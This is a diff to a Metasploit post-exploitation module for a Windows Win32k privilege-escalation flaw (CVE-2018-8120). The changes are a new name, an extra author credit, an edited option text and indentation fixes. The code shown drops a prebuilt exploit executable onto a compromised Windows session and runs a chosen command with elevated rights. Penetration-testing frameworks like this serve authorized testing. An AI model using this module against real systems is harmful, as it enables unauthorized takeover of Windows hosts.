@@ -11,7 +11,7 @@ class MetasploitModule < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Wink32.sys fails to handle objects in memory (Win32k Elevation of Privilege Vulnerability)',
+      'Name'        => 'Windows SetImeInfoEx Win32k NULL Pointer Dereference',
       'Description' => %q{
         This module exploits elevation of privilege vulnerability exists in Windows 7 and 2008 R2
         when the Win32k component fails to properly handle objects in memory. An attacker who
@@ -30,6 +30,7 @@ class MetasploitModule < Msf::Post
       'Author'      =>
         [
           'unamer', # Exploit PoC
+          'bigric3', # Analysis and exploit
           'Anton Cherepanov', # Vulnerability discovery
           'Dhiraj Mishra <dhiraj@notsosecure.com>' # Metasploit module
         ],
@@ -41,7 +42,7 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-         OptString.new('POCCMD', [true, 'The command to run from poc.sct']),
+         OptString.new('POCCMD', [true, 'The command to run from CVE-2018-8120']),
       ])
   end
 
@@ -55,22 +56,21 @@ class MetasploitModule < Msf::Post
     temprexe
    end
 
-     def write_file_to_target(temprexe,rexe)
+   def write_file_to_target(temprexe,rexe)
       fd = session.fs.file.new(temprexe, "wb")
       fd.write(rexe)
       fd.close
    end
 
-     def create_payload_from_file(exec)
+   def create_payload_from_file(exec)
       print_status("Reading Payload from file #{exec}")
       ::IO.read(exec)
    end
 
-     def run
+   def run
       rexename =  Rex::Text.rand_text_alphanumeric(10) + ".exe"
       print_status("exe name is: #{rexename}")
       poccmd =  datastore['POCCMD']
-      cmdcheck = datastore['CMDCHECK']
 
       rexe = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'CVE-2018-8120.exe')
       raw = create_payload_from_file rexe
